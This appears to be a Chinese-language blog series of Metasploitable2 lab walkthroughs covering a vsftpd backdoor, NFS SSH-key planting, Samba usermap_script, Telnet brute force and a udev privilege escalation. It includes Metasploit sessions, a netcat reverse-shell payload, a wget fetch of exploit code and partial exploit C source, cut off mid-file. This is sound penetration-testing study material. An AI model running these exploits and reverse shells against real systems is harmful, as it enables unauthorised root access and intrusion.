exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit <br><br>[*] 192.168.52.144:21 - Banner: 220 (vsFTPd 2.3.4)<br>[*] 192.168.52.144:21 - USER: 331 Please specify the password.<br>[+] 192.168.52.144:21 - Backdoor service has been spawned, handling...<br>[+] 192.168.52.144:21 - UID: uid=0(root) gid=0(root)<br>[*] Found shell.<br>[*] Command shell session 1 opened (192.168.52.134:40789 -&gt; 192.168.52.144:6200) at 2020-05-05 16:14:46 +0800<br><br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>root@metasploitable:/<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root)<br>root@metasploitable:/<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure><h2 id="linux-NFS共享目录配置漏洞"><a href="#linux-NFS共享目录配置漏洞" class="headerlink" title="linux NFS共享目录配置漏洞"></a>linux NFS共享目录配置漏洞</h2><h3 id="查看nfs是否开放"><a href="#查看nfs是否开放" class="headerlink" title="查看nfs是否开放"></a>查看nfs是否开放</h3><p>rpcinfo -p [target ip]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ rpcinfo -p 192.168.52.144<br>   program vers proto   port  service<br>    100000    2   tcp    111  portmapper<br>    100000    2   udp    111  portmapper<br>    100024    1   udp  38822  status<br>    100024    1   tcp  50018  status<br>    100003    2   udp   2049  nfs<br>    100003    3   udp   2049  nfs<br>    100003    4   udp   2049  nfs<br>    100021    1   udp  47531  nlockmgr<br>    100021    3   udp  47531  nlockmgr<br>    100021    4   udp  47531  nlockmgr<br>    100003    2   tcp   2049  nfs<br>    100003    3   tcp   2049  nfs<br>    100003    4   tcp   2049  nfs<br>    100021    1   tcp  52585  nlockmgr<br>    100021    3   tcp  52585  nlockmgr<br>    100021    4   tcp  52585  nlockmgr<br>    100005    1   udp  36165  mountd<br>    100005    1   tcp  39215  mountd<br>    100005    2   udp  36165  mountd<br>    100005    2   tcp  39215  mountd<br>    100005    3   udp  36165  mountd<br>    100005    3   tcp  39215  mountd<br></code></pre></td></tr></table></figure><h3 id="查看目标设置的共享目录列表"><a href="#查看目标设置的共享目录列表" class="headerlink" title="查看目标设置的共享目录列表"></a>查看目标设置的共享目录列表</h3><p>showmount -e [target ip]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ showmount -e 192.168.52.144<br>Export list <span class="hljs-keyword">for</span> 192.168.52.144:<br>/ *<br></code></pre></td></tr></table></figure><p>发现共享根目录下所有目录。</p><h3 id="生成rsa-公钥"><a href="#生成rsa-公钥" class="headerlink" title="生成rsa 公钥"></a>生成rsa 公钥</h3><p>ssh-keygen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ ssh-keygen <br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/xin/.ssh/id_rsa): <br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/xin/.ssh/id_rsa.<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/xin/.ssh/id_rsa.pub.<br>The key fingerprint is:<br>SHA256:1E7/aDLdsjBakGT1TaaGUsA1MEnTYZWqajDBoaPPjCs xin@kali<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|       o**Bo..o  |</span><br><span class="hljs-string">|    .   oB.+.=   |</span><br><span class="hljs-string">|   o .  = +.+ .  |</span><br><span class="hljs-string">|  o o  + =.o     |</span><br><span class="hljs-string">| . . .  S.. .    |</span><br><span class="hljs-string">|.   o   .. . +   |</span><br><span class="hljs-string">| =   o .  * = o  |</span><br><span class="hljs-string">|E +   o  o * o   |</span><br><span class="hljs-string">|o.   .  .   .    |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure><h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ <span class="hljs-built_in">mkdir</span> /tmp/msftables<br>xin@kali:~$ mount -o nolock -t nfs 192.168.52.144:/ /tmp/msftables<br>mount: only root can use <span class="hljs-string">&quot;--options&quot;</span> option<br>xin@kali:~$ sudo mount -o nolock -t nfs 192.168.52.144:/ /tmp/msftables<br>[sudo] xin 的密码：<br>xin@kali:~$ <span class="hljs-built_in">cat</span> /home/xin/.ssh/id_rsa.pub &gt;&gt; /tmp/msftables/root/.ssh/authorized_keys <br>bash: /tmp/msftables/root/.ssh/authorized_keys: 权限不够<br><br>xin@kali:~$ sudo <span class="hljs-built_in">cat</span> /home/xin/.ssh/id_rsa.pub &gt;&gt; /tmp/msftables/home/msfadmin/.ssh/authorized_keys <br>xin@kali:~$ ssh msfadmin@192.168.52.144<br>The authenticity of host <span class="hljs-string">&#x27;192.168.52.144 (192.168.52.144)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.52.144<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Ubuntu system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="hljs-string">applicable law.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To access official Ubuntu documentation, please visit:</span><br><span class="hljs-string">http://help.ubuntu.com/</span><br><span class="hljs-string">No mail.</span><br><span class="hljs-string">Last login: Tue May  5 04:14:33 2020</span><br><span class="hljs-string">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="hljs-string">See &quot;man sudo_root&quot; for details.</span><br><span class="hljs-string"></span><br><span class="hljs-string">msfadmin@metasploitable:~$ whoami</span><br><span class="hljs-string">msfadmin</span><br><span class="hljs-string">msfadmin@metasploitable:~$ </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>中间试着把认证公钥放到root目录下时显示权限不够，不得已只能放到用户目录下使用msfadmin权限，后面还可以使用之前的套路提权。</p><h2 id="samba-smbd-3-x"><a href="#samba-smbd-3-x" class="headerlink" title="samba smbd 3.x"></a>samba smbd 3.x</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 exploit(linux/samba/is_known_pipename) &gt; search samba<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                                 Disclosure Date  Rank       Check  Description</span><br>   -   ----                                                 ---------------  ----       -----  -----------<br>   0   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal<br>   1   auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow<br>   2   auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow<br>   3   auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow<br>   4   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules<br>   5   auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State<br>   6   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)<br>   7   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)<br>   8   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load<br>   9   exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow<br>   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow<br>   11  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)<br>   12  exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow<br>   13  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba <span class="hljs-string">&quot;username map script&quot;</span> Command Execution<br>   14  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow<br>   15  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)<br>   16  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow<br>   17  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)<br>   18  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection<br>   19  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution<br>   20  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution<br>   21  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution<br>   22  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow<br>   23  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow<br>   24  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource<br>   25  post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations<br><br><br>msf5 exploit(linux/samba/is_known_pipename) &gt; use exploit/multi/samba/usermap_script <br>msf5 exploit(multi/samba/usermap_script) &gt; <span class="hljs-built_in">set</span> rhost 192.168.52.144<br>rhost =&gt; 192.168.52.144<br>msf5 exploit(multi/samba/usermap_script) &gt; show options <br><br>Module options (exploit/multi/samba/usermap_script):<br><br>   Name    Current Setting  Required  Description<br>   ----    ---------------  --------  -----------<br>   RHOSTS  192.168.52.144   <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT   139              <span class="hljs-built_in">yes</span>       The target port (TCP)<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic<br><br><br>msf5 exploit(multi/samba/usermap_script) &gt; exploit <br><br>[*] Started reverse TCP double handler on 192.168.52.134:4444 <br>[*] Accepted the first client connection...<br>[*] Accepted the second client connection...<br>[*] Command: <span class="hljs-built_in">echo</span> 7VUWl3ceAVJuDGMo;<br>[*] Writing to socket A<br>[*] Writing to socket B<br>[*] Reading from sockets...<br>[*] Reading from socket B<br>[*] B: <span class="hljs-string">&quot;7VUWl3ceAVJuDGMo\r\n&quot;</span><br>[*] Matching...<br>[*] A is input...<br>[*] Command shell session 2 opened (192.168.52.134:4444 -&gt; 192.168.52.144:60318) at 2020-05-05 17:10:26 +0800<br><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root)<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Metasploitable2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploitable2系列练习-漏洞利用之Telnet的登录提权</title>
    <link href="/blog/2020/05/02/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BTelnet%E7%9A%84%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/"/>
    <url>/blog/2020/05/02/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BTelnet%E7%9A%84%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p><strong>继续上一篇的内容，本次使用的是Telnet的弱密码和登录提权。</strong></p><p><img src="/images/fj45.jpg"></p><span id="more"></span><h2 id="什么是Telnet？"><a href="#什么是Telnet？" class="headerlink" title="什么是Telnet？"></a>什么是Telnet？</h2><p>Telnet协议是TCP&#x2F;IP协议族中的一员，是internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。<br>虽然telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，telnet并不被重用。原因在于telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都以明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用telnet服务。如果我们要使用telnet的远程登录，使用前应在远端服务器上检查并设置允许telnet服务的功能。</p><h2 id="Telnet登录提权"><a href="#Telnet登录提权" class="headerlink" title="Telnet登录提权"></a>Telnet登录提权</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>扫描结果如下，我们发现23端口是开放的：</p><p><img src="/images/metasploitable2-0.png"></p><p>打开msf，使用telnet_version模块来探测telnet的版本信息：</p><p>use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version</p><p>set rhost  192.168.52.144</p><p>run </p><p><img src="/images/telnet0.png"></p><p>可以看到用户名密码都是msfadmin。</p><h3 id="msf尝试登录"><a href="#msf尝试登录" class="headerlink" title="msf尝试登录"></a>msf尝试登录</h3><p>然后使用登录模块尝试登录：</p><p>use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login </p><p>参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Module options (auxiliary/scanner/telnet/telnet_login):<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BLANK_PASSWORDS   <span class="hljs-literal">false</span>            no        Try blank passwords <span class="hljs-keyword">for</span> all <span class="hljs-built_in">users</span><br>   BRUTEFORCE_SPEED  5                <span class="hljs-built_in">yes</span>       How fast to bruteforce, from 0 to 5<br>   DB_ALL_CREDS      <span class="hljs-literal">false</span>            no        Try each user/password couple stored <span class="hljs-keyword">in</span> the current database<br>   DB_ALL_PASS       <span class="hljs-literal">false</span>            no        Add all passwords <span class="hljs-keyword">in</span> the current database to the list<br>   DB_ALL_USERS      <span class="hljs-literal">false</span>            no        Add all <span class="hljs-built_in">users</span> <span class="hljs-keyword">in</span> the current database to the list<br>   PASS_FILE                          no        File containing passwords, one per line<br>   RHOSTS                             <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT             23               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   STOP_ON_SUCCESS   <span class="hljs-literal">false</span>            <span class="hljs-built_in">yes</span>       Stop guessing when a credential works <span class="hljs-keyword">for</span> a host<br>   THREADS           1                <span class="hljs-built_in">yes</span>       The number of concurrent threads (max one per host)<br>   USERPASS_FILE                      no        File containing <span class="hljs-built_in">users</span> and passwords separated by space, one pair per line<br>   USER_AS_PASS      <span class="hljs-literal">false</span>            no        Try the username as the password <span class="hljs-keyword">for</span> all <span class="hljs-built_in">users</span><br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           <span class="hljs-literal">true</span>             <span class="hljs-built_in">yes</span>       Whether to <span class="hljs-built_in">print</span> output <span class="hljs-keyword">for</span> all attempts<br><br></code></pre></td></tr></table></figure><p>设置用户名、口令对应的文件路径，然后设置目标，run即可：</p><p><img src="/images/telnet1.png"></p><p>这个只是获取的msfadmin权限的shell，我们可以用sessions -u [id]把相应的连接设置成<strong>meterpreter shell</strong></p><p><img src="/images/telnet2.png"></p><p><strong>meterpreter shell</strong>是一种高级、隐蔽、多层面的且可动态扩展的payload，可以将反射dll注入到目标主机的内存中，还可以在运行时动态加载脚本和插件来进行后渗透利用。包括提权、转存系统账号、键盘记录、持久后门服务、启用远程桌面等，还有很多其他的扩展。而且，<strong>meterpreter</strong> shell的整个通信都是默认加密的。</p><h3 id="利用exp提权"><a href="#利用exp提权" class="headerlink" title="利用exp提权"></a>利用exp提权</h3><p>从 <a href="https://www.exploit-db.com/download/8572">https://www.exploit-db.com/download/8572</a></p><p>下载exp，放到kali的&#x2F;var&#x2F;www&#x2F;html目录下，并将下载的C文件chmod 777 </p><p>然后开启apache服务：service apache2 start</p><p>然后切换到靶机telnet，从kali下载提权代码并编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfadmin@metasploitable:~$ wget 192.168.52.134/test.c<br>--22:00:56--  http://192.168.52.134/test.c<br>           =&gt; `test.c<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Connecting to 192.168.52.134:80... connected.</span><br><span class="hljs-string">HTTP request sent, awaiting response... 200 OK</span><br><span class="hljs-string">Length: 2,902 (2.8K) [text/x-csrc]</span><br><span class="hljs-string"></span><br><span class="hljs-string">100%[=======================================================================&gt;] 2,902         --.--K/s             </span><br><span class="hljs-string"></span><br><span class="hljs-string">22:00:56 (566.80 KB/s) - `test.c&#x27;</span> saved [2902/2902]<br><br>msfadmin@metasploitable:~$ <span class="hljs-built_in">ls</span><br>test.cvulnerable<br>msfadmin@metasploitable:~$ gcc -o exploit test.c     <br></code></pre></td></tr></table></figure><p>然后切换回kali，使用nc监听：</p><p>nc -lvp 4444（端口号随意，只需要和下面的端口号一样即可）</p><p>然后在靶机telnet进行下面操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfadmin@metasploitable:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh&#x27;</span> &gt; /tmp/run<br>msfadmin@metasploitable:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/netcat -e /bin/sh 192.168.52.134 4444&#x27;</span> &gt;&gt; /tmp/run<br>msfadmin@metasploitable:~$ ps aux | grep udev<br>root      2719  0.0  0.1   2092   620 ?        S&lt;s  07:31   0:00 /sbin/udevd --daemon<br>msfadmin  7331  0.0  0.1   3008   772 pts/2    R+   22:05   0:00 grep udev<br><span class="hljs-comment">#执行exploit 具有root权限的pid减1</span><br>msfadmin@metasploitable:~$ ./exploit 2718<br><br></code></pre></td></tr></table></figure><p>运行完之后，监听端口反弹shell，拿到root权限：</p><p><img src="/images/telnet3.png"></p><p>然后可以使用 python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’ 获取伪终端方便使用</p><h3 id="为什么可以提权"><a href="#为什么可以提权" class="headerlink" title="为什么可以提权"></a>为什么可以提权</h3><p>提权代码利用的是cve-2009-1185  init未检查NETLINK消息来源,本地提权漏洞。</p><p>udev是Linuxkernel系列的设备管理器，主要功能是管理&#x2F;dev目录下的设备节点。udev没有正确地检查Netlink消息的来源，本地攻击者可以利用这个漏洞从用户空间进程而不是内核向udev发送特制的Netlink消息，导致其创建已有系统块设备(如root文件系统)完全可写的块设备文件，以获得root用户权限。</p><p><strong>exp代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * cve-2009-1185.c</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * udev &lt; 141 Local Privilege Escalation Exploit</span><br><span class="hljs-comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span><br><span class="hljs-comment"> * http://jon.oberheide.org</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Information:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   udev before 1.4.1 does not verify whether a NETLINK message originates </span><br><span class="hljs-comment"> *   from kernel space, which allows local users to gain privileges by sending </span><br><span class="hljs-comment"> *   a NETLINK message from user space.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Notes:</span><br><span class="hljs-comment"> *   </span><br><span class="hljs-comment"> *   An alternate version of kcope&#x27;s exploit.  This exploit leverages the </span><br><span class="hljs-comment"> *   95-udev-late.rules functionality that is meant to run arbitrary commands </span><br><span class="hljs-comment"> *   when a device is removed.  A bit cleaner and reliable as long as your </span><br><span class="hljs-comment"> *   distro ships that rule file.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Tested on Gentoo, Intrepid, and Jaunty.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, </span><br><span class="hljs-comment"> *   usually is the udevd PID minus 1) as argv[1].</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The exploit will execute /tmp/run as root so throw whatever payload you </span><br><span class="hljs-comment"> *   want in there.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netlink.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NETLINK_KOBJECT_UEVENT</span><br><span 